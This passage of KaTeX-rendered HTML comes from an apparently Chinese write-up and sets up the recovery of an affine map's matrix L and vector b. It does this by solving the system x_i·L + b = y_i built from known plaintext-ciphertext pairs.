10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9084399999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.17994em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span></span></span></span> 的方程。</li>\n</ul>\n</li>\n<li>给出的明文密文对一定是有解的</li>\n</ul>\n<p>于是问题转化为已知 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个方程：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><msub><mover accent=\"true\"><mi>x</mi><mo>⃗</mo></mover><mn>1</mn></msub><mo>⋅</mo><mi>L</mi><mo>+</mo><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><msub><mover accent=\"true\"><mi>y</mi><mo>⃗</mo></mover><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><msub><mover accent=\"true\"><mi>x</mi><mo>⃗</mo></mover><mn>2</mn></msub><mo>⋅</mo><mi>L</mi><mo>+</mo><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><msub><mover accent=\"true\"><mi>y</mi><mo>⃗</mo></mover><mn>2</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>⋯</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><msub><mover accent=\"true\"><mi>x</mi><mo>⃗</mo></mover><mi>n</mi></msub><mo>⋅</mo><mi>L</mi><mo>+</mo><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><msub><mover accent=\"true\"><mi>y</mi><mo>⃗</mo></mover><mi>n</mi></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n\\vec x_{1}\\cdot L+\\vec b&amp;=\\vec y_{1}\\\\\n\\vec x_{2}\\cdot L+\\vec b&amp;=\\vec y_{2}\\\\\n&amp;\\cdots\\\\\n\\vec x_{n}\\cdot L+\\vec b&amp;=\\vec y_{n}\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:6.412319999999999em;vertical-align:-2.95616em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.4561599999999997em;\"><span style=\"top:-5.47872em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.20772em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span><span style=\"top:-3.8412800000000002em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.20772em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span><span style=\"top:-2.3412799999999994em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.70384em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.20772em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.95616em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.4561599999999997em;\"><span style=\"top:-5.47872em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.17994em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-3.8412800000000002em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.17994em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.3412799999999994em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span></span></span><span style=\"top:-0.70384em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.17994em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.95616em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>求解矩阵 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span> 和向量 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span>。</p>\n<p>也可以写成：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mrow><mo fence=\"true\">(</mo><mtable rowspacing=\"0.15999999999999992em\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mn>1</mn><mi>m</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mn>2</mn><mi>m</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" 